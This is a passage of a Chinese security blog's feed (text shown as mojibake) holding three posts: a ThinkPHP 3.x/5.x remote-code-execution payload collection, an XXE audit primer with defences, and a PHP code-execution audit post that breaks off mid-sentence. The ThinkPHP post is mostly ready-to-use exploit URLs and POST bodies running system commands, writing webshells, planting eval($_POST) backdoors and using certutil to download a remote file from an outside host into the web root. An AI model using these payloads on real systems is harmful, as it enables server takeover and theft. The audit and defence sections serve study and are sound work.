s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-18"><a href="#Thinkphp-5-0-18" class="headerlink" title="Thinkphp 5.0.18"></a>Thinkphp 5.0.18</h3><p>1ã€windows</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()</code></pre><p>2ã€ä½¿ç”¨certutil</p><pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php</code></pre><p>ç”±äºæ ¹ç›®å½•æ²¡å†™æƒé™ï¼Œæ‰€</p><h3 id="Thinkphp-5-0-19"><a href="#Thinkphp-5-0-19" class="headerlink" title="Thinkphp 5.0.19"></a>Thinkphp 5.0.19</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-20"><a href="#Thinkphp-5-0-20" class="headerlink" title="Thinkphp 5.0.20"></a>Thinkphp 5.0.20</h3><blockquote><p><a href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-21"><a href="#Thinkphp-5-0-21" class="headerlink" title="Thinkphp 5.0.21"></a>Thinkphp 5.0.21</h3><p>1ã€poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2ã€poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>3ã€poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=system(&quot;whoami&quot;);</code></pre><p>4ã€poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=eval($_POST[ian])</code></pre><h3 id="Thinkphp-5-0-22"><a href="#Thinkphp-5-0-22" class="headerlink" title="Thinkphp 5.0.22"></a>Thinkphp 5.0.22</h3><p>1ã€poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2ã€poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</code></pre><h3 id="Thinkphp-5-0-23"><a href="#Thinkphp-5-0-23" class="headerlink" title="Thinkphp 5.0.23"></a>Thinkphp 5.0.23</h3><pre><code>POST /index.php?s=captcha HTTP/1.1Host: yuoripAccept-Encoding: gzip, deflateAccept: */* Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h3 id="Thinkphp-5-1-18"><a href="#Thinkphp-5-1-18" class="headerlink" title="Thinkphp 5.1.18"></a>Thinkphp 5.1.18</h3><p>1ã€å¸¸è§„poc</p><pre><code>http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index_bak2.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;</code></pre><p>2ã€æ‰€æœ‰ç›®å½•éƒ½æ— å†™å…¥æƒé™,base64å‡½æ•°è¢«æ‹¦æˆª</p><pre><code> http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1]</code></pre><h3 id="Thinkphp-5-1-29"><a href="#Thinkphp-5-1-29" class="headerlink" title="Thinkphp 5.1.29"></a>Thinkphp 5.1.29</h3><p>1ã€ä»£ç æ‰§è¡Œ</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>2ã€å‘½ä»¤æ‰§è¡Œ</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=system&amp;data=æ“ä½œç³»ç»Ÿå‘½ä»¤http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=æ“ä½œç³»ç»Ÿå‘½ä»¤http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=æ“ä½œç³»ç»Ÿå‘½ä»¤</code></pre><p>3ã€æ–‡ä»¶å†™å…¥</p><pre><code>http://test.com/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3Ehttp://test.com/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3</code></pre><p>ä»¥ä¸Šèµ„æºæ¥æºä¸äº’è”ç½‘ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·é‚®ç®±è”ç³»æˆ‘ï¼ŒåŠæ—¶åˆ é™¤ã€‚</p><p><a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12203534.html">https://www.cnblogs.com/AtesetEnginner/p/12203534.html</a></p>]]></content>
    
    
    <summary type="html">ThinkPHP 3.x ï¼Œ5.x æ¼æ´ç›¸å…³çš„RCEï¼ŒåªåŒ…å«å‘½ä»¤æ‰§è¡ŒPOCæˆ–è€…EXPã€‚</summary>
    
    
    
    <category term="çº¢é˜Ÿæ‰“ç‚¹" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="RCE" scheme="https://fz1lin.com/tags/RCE/"/>
    
    <category term="ThinkPHP" scheme="https://fz1lin.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡-xxeæ¼æ´</title>
    <link href="https://fz1lin.com/2022/2636630250/"/>
    <id>https://fz1lin.com/2022/2636630250/</id>
    <published>2022-01-03T02:22:31.000Z</published>
    <updated>2022-01-03T02:40:51.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-XXE-æ¦‚è¿°"><a href="#0x01-XXE-æ¦‚è¿°" class="headerlink" title="0x01 XXE æ¦‚è¿°"></a>0x01 XXE æ¦‚è¿°</h2><p>XXEï¼ˆXML External Entityï¼‰å³ XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œæ˜¯é’ˆå¯¹ä½¿ç”¨ XML æ ‡å‡†è¯­è¨€äº¤äº’çš„ Web åº”ç”¨æ”»å‡»ï¼Œç”±äº XML æ–‡æ¡£ç»“æ„çš„ DTD åœ¨å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œæœªå¯¹å¤–éƒ¨å®ä½“è¿›è¡Œæ•æ„Ÿå­—ç¬¦è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥è°¨ï¼Œé€ æˆäº†è¯¥æ¼æ´ç±»å‹çš„äº§ç”Ÿã€‚</p><h3 id="1-XML-åŸºç¡€"><a href="#1-XML-åŸºç¡€" class="headerlink" title="1.XML åŸºç¡€"></a>1.XML åŸºç¡€</h3><p>XMLæ˜¯å…·æœ‰ç»“æ„æ€§çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œæ˜¯ç”¨æ¥ä¼ è¾“/ä¿å­˜æ•°æ®è€Œä¸æ˜¯ç°å®æ•°æ®çš„ï¼Œåœ¨é…ç½®æ–‡ä»¶ï¼ˆStrutsï¼ŒSprintï¼‰ã€æ–‡æ¡£ç»“æ„è¯´æ˜ï¼ˆå¦‚æœ¬åšå®¢çš„RSSï¼‰åº”ç”¨æ¯”è¾ƒå¤šã€‚</p><p>XML è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®ï¼Œå„ç§åº”ç”¨ç¨‹åºä¹‹é—´æ•°æ®ä¼ è¾“ä¸­æœ€å¸¸ç”¨çš„å·¥å…·ã€‚</p><h3 id="2-XML-ç»“æ„"><a href="#2-XML-ç»“æ„" class="headerlink" title="2.XML ç»“æ„"></a>2.XML ç»“æ„</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XML <span class="comment">//æ–‡æ¡£å£°æ˜ï¼Œåœ¨æ–‡æ¡£çš„ç¬¬ä¸€è¡Œ</span></span><br><span class="line">XML <span class="comment">//æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDï¼ŒXXE æ¼æ´æ‰€åœ¨çš„åœ°æ–¹</span></span><br><span class="line">XML <span class="comment">//æ–‡æ¡£å…ƒç´      </span></span><br></pre></td></tr></table></figure><p><img src="/2022/2636630250/image-20220103094629033.png" alt="image-20220103094629033"> </p><h3 id="3-XML-DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰"><a href="#3-XML-DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰" class="headerlink" title="3.XML DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰"></a>3.XML DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰</h3><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯ä»¥æ˜¯å†…éƒ¨å£°æ˜ä¹Ÿå¯ä»¥å¼•ç”¨å¤–éƒ¨ DTD</p><p>å†…éƒ¨å£°æ˜ DTD æ ¼å¼ï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code><br>å¼•ç”¨å¤–éƒ¨ DTD æ ¼å¼ï¼š<code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code><br>åœ¨DTDä¸­è¿›è¡Œå®ä½“å£°æ˜æ—¶ï¼Œå°†ä½¿ç”¨ ENTITY å…³é”®å­—æ¥å£°æ˜ã€‚å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šç¨³å®šæˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜</p><p>å†…éƒ¨å£°æ˜å®ä½“æ ¼å¼ï¼š<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code><br>å¼•ç”¨å¤–éƒ¨å®ä½“æ ¼å¼ï¼š<code>&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URL&quot;&gt;</code></p><h3 id="4-å¤–éƒ¨å®ä½“æ”¯æŒåè®®"><a href="#4-å¤–éƒ¨å®ä½“æ”¯æŒåè®®" class="headerlink" title="4.å¤–éƒ¨å®ä½“æ”¯æŒåè®®"></a>4.å¤–éƒ¨å®ä½“æ”¯æŒåè®®</h3><p>å¼•ç”¨å¤–éƒ¨å®ä½“æ”¯æŒåè®®</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zlib<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>file<br>http<br>https<br>ftp</td></tr></tbody></table><p>PHPæ”¯æŒçš„æ‰©å±•åè®®</p><table><thead><tr><th>Scheme</th><th>Extension Required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h3 id="5-Blind-XXE"><a href="#5-Blind-XXE" class="headerlink" title="5.Blind XXE"></a>5.Blind XXE</h3><p>Blind XXE å³æœåŠ¡å™¨æ— å›æ˜¾æ˜¯ï¼Œå¯ä»¥é‡‡ç”¨ Blind XXEï¼ˆç›²æ³¨ XXEï¼‰ï¼Œä¸»è¦ä½¿ç”¨äº† DTD ä¸­çš„å‚æ•°å®ä½“å’Œå†…éƒ¨å®ä½“ï¼Œå‚æ•°å®ä½“æ˜¯åªèƒ½åœ¨DTDä¸­å®šä¹‰å’Œä½¿ç”¨çš„å®ä½“ï¼Œä»¥ %ä¸ºæ ‡å¿—å®šä¹‰ï¼Œå®šä¹‰å’Œä½¿ç”¨æ–¹æ³•ï¼Œå†…éƒ¨å®ä½“æ˜¯æŒ‡åœ¨ä¸€ä¸ªå®ä½“ä¸­å®šä¹‰çš„å¦ä¸€ä¸ªå®ä½“ï¼Œå®ä½“ä¹‹é—´ç›¸äº’è¿›è¡Œå¯¹å¤–å®ä½“çš„åŒ…å®¹ï¼Œå³ä¿—ç§°çš„åµŒå¥—å®ä½“ã€‚</p><h2 id="0x02-é˜²å¾¡å»ºè®®"><a href="#0x02-é˜²å¾¡å»ºè®®" class="headerlink" title="0x02 é˜²å¾¡å»ºè®®"></a>0x02 é˜²å¾¡å»ºè®®</h2><p>ç¦ç”¨å¤–éƒ¨å¼•ç”¨å’Œè¿‡æ»¤æ•æ„Ÿå…³é”®è¯ã€‚</p><ul><li><p>PHP ç¦ç”¨å¼•ç”¨å¤–éƒ¨å®ä½“</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></blockquote></li><li><p>PHPè¿‡æ»¤æ•æ„Ÿå…³é”®è¯</p></li></ul><blockquote><p>åœ¨è§£æé…ç½®æ–‡ä»¶ã€ç½‘ç»œæ•°æ®æ—¶ã€æ ¡éªŒå¹¶è¿‡æ»¤æ‰ <code>&lt;!DOCYPE&gt;ã€&lt;!ENTITY&gt;ã€SYSTEMã€PUBLICç­‰ç›¸å…³çš„å…³é”®è¯</code></p></blockquote><h2 id="0x03-ä»£ç å®¡è®¡"><a href="#0x03-ä»£ç å®¡è®¡" class="headerlink" title="0x03 ä»£ç å®¡è®¡"></a>0x03 ä»£ç å®¡è®¡</h2><p>XXE ä¸å…³é”®è¯å¯†åˆ‡ç›¸å…³ï¼Œå¯¹XXE å®¡è®¡æ–¹æ³•ä¹Ÿæ˜¯ç›´æ¥æœç´¢ç›¸å…³çš„å…³é”®è¯ï¼Œå¦‚ file_get_contentsã€php://inputã€simplexml_load_stringç­‰å›´ç»•è¿™äº›å…³é”®è¯ä¸Šä¸‹æ–‡åˆ†æï¼Œçœ‹æ˜¯å¦å­˜åœ¨ XXEæ¼æ´</p><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents"></a>1.file_get_contents</h3><p>file_get_contents â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$filename</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>,</span><br><span class="line">    resource <span class="variable">$context</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = ?</span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h3><p>æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚</p><p>ç»“åˆ file_get_contents(â€œphp://inputâ€) å¯ä»¥è¯»å–POSTæäº¤çš„æ•°æ®ï¼Œå­˜å…¥ <code>$xml</code>ï¼Œ</p><h3 id="3-simplexml-load-string"><a href="#3-simplexml-load-string" class="headerlink" title="3.simplexml_load_string"></a>3.simplexml_load_string</h3><p>php ä¸­çš„ simplexml_load_string å‡½æ•°å°†xml æ ¼å¼å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹åº”çš„simpleXMLElementObject</p><p>å…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„ <a href="https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501">æµ…è°ˆ XXE æ¼æ´ä»»æ„æ–‡ä»¶è¯»å–</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>xxe å®¡è®¡çš„æ€è·¯ï¼Œå°±æ˜¯ç»“åˆå…³é”®çš„å‡½æ•°ï¼Œä»¥åŠæ˜¯å¦å¼€å¯å¯¹åº”çš„åŠŸèƒ½ï¼Œè¿›è¡Œå®¡è®¡ï¼Œç›´æ¥ä½¿ç”¨å…³é”®å­—æœç´¢å³å¯ã€‚</p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://www.php.net/manual/zh/function.file-get-contents">https://www.php.net/manual/zh/function.file-get-contents</a></p><p><a href="https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501">https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">XXEçš„åŸºç¡€ä»‹ç»ï¼ŒåŠå®¡è®¡æ€è·¯</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="XXE" scheme="https://fz1lin.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>PHPä»£ç å®¡è®¡-ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œ</title>
    <link href="https://fz1lin.com/2021/4050625683/"/>
    <id>https://fz1lin.com/2021/4050625683/</id>
    <published>2021-12-24T09:30:52.000Z</published>
    <updated>2021-12-28T09:59:59.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«"><a href="#0x00-ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«" class="headerlink" title="0x00 ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«"></a>0x00 ä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«</h2><ul><li><p>ä»£ç æ‰§è¡Œæ˜¯æŒ‡ç”¨æˆ·é€šè¿‡å®¢æˆ·ç«¯æäº¤å¯æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œç”±äºæœåŠ¡å™¨æ²¡æœ‰å¯¹å…¶å‡½æ•°çš„å‚æ•°åšæœ‰æ•ˆè¿‡æ»¤ï¼Œå¯¼è‡´ç³»ç»Ÿæ‰§è¡Œäº†éæ³•å‘½ä»¤ä»£ç </p></li><li><p>å‘½ä»¤æ‰§è¡Œæ˜¯æŒ‡è¢«æ”»å‡»è€…åˆ©ç”¨ä»è€Œåœ¨ç³»ç»Ÿä¸­æ‰§è¡Œä»»æ„æŒ‡ä»¤çš„æ¼æ´ï¼Œé€šè¿‡è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆç›¸å½“äºipconfigç­‰æ‰§è¡Œå‘½ä»¤ï¼‰</p></li></ul><h2 id="0x01-ä»£ç æ‰§è¡Œ"><a href="#0x01-ä»£ç æ‰§è¡Œ" class="headerlink" title="0x01 ä»£ç æ‰§è¡Œ"></a>0x01 ä»£ç æ‰§è¡Œ</h2><p>ä»£ç æ‰§è¡Œæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œåœ¨ç³»ç»Ÿè®¾è®¡å’Œå¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†ç»™ç”¨æˆ·å¸¦æ¥å„ç§å„æ ·çš„åŠŸèƒ½ï¼Œä»¥åŠä¸šåŠ¡çš„ä¾¿åˆ©æ€§ï¼Œå¹¶æ²¡æœ‰æ³¨æ„ç¨‹åºä»£ç æ‰€ç”¨çš„å‡½æ•°ï¼Œå®ç°çš„åŠŸèƒ½ã€æ‰§è¡Œçš„æµç¨‹ç­‰æ–¹é¢æ˜¯å¦å®‰å…¨ï¼Œæ‰€ä»¥äº§ç”Ÿçš„åŸå› å°±æ˜¯ï¼Œæ²¡æœ‰å¯¹æ•´ä½“çš„æ¶æ„ï¼Œçº³å…¥å®‰å…¨è€ƒè™‘ï¼Œæ‰å¯¼è‡´çš„ä»£ç æ‰§è¡Œã€‚</p><h3 id="1-ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#1-ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.ä»£ç æ‰§è¡Œå‡½æ•°"></a>1.ä»£ç æ‰§è¡Œå‡½æ•°</h3><p>ä»£ç æ‰§è¡Œï¼Œå°±æ˜¯é€šè¿‡å‚æ•°ã€å˜é‡ç­‰åˆ¶å®šå¯ä»¥æ‰§è¡Œçš„ä»£ç ï¼Œå‚æ•°å’Œå˜é‡ä¸­ï¼Œä¸æ˜¯æ•°å­—ã€å­—ç¬¦ä¸²ç­‰ï¼Œè€Œæ˜¯æ¶æ„çš„ä»£ç ï¼Œä»è€Œå¯¼è‡´äº†ä»£ç æ‰§è¡Œã€‚åœ¨PHPè¯­è¨€å’Œæ¡†æ¶ä¸­ï¼Œæœ‰å¾ˆå¤šä»£ç æ‰§è¡Œå‡½æ•°ï¼Œå¦‚ä¸‹</p><p>åŠ¨æ€å‡½æ•°ï¼Œè¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œå°±ä¼šè§¦å‘ä»£ç æ‰§è¡Œ</p><table><thead><tr><th>å‡½æ•°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>eval()</td><td>æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</td></tr><tr><td>assert()</td><td>æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º <code>false</code></td></tr><tr><td>preg_replace()</td><td>æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</td></tr><tr><td>call_user_func()</td><td>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</td></tr><tr><td>call_user_func_array()</td><td>è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</td></tr><tr><td>create_function()</td><td>åˆ›å»ºåŒ¿åï¼ˆlambda é£æ ¼ï¼‰å‡½æ•°</td></tr><tr><td>array_map()</td><td>ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°</td></tr></tbody></table><p>é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œä»£ç æ‰§è¡Œ</p><table><thead><tr><th>å‡½æ•°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>include()</td><td>åŒ…å«å¤šæ¬¡</td></tr><tr><td>include_once()</td><td>åŒ…å«ä¸€æ¬¡</td></tr><tr><td>require()</td><td>åŒ…å«å¤šæ¬¡</td></tr><tr><td>require_once()</td><td>åŒ…å«ä¸€æ¬¡</td></tr><tr><td>file_get_contents()</td><td>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>file_put_contents()</td><td>å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</td></tr><tr><td>fwrite()</td><td>å†™å…¥æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</td></tr></tbody></table><h3 id="2-preg-replace"><a href="#2-preg-replace" class="headerlink" title="2.preg_replace"></a>2.preg_replace</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„</p><p>æ¼æ´æˆå› </p><p>å½“ç¬¬ä¸€ä¸ªå‚æ•° patern å­˜åœ¨ /e æ¨¡å¼ä¿®é¥°ç¬¦ä¸” PHP 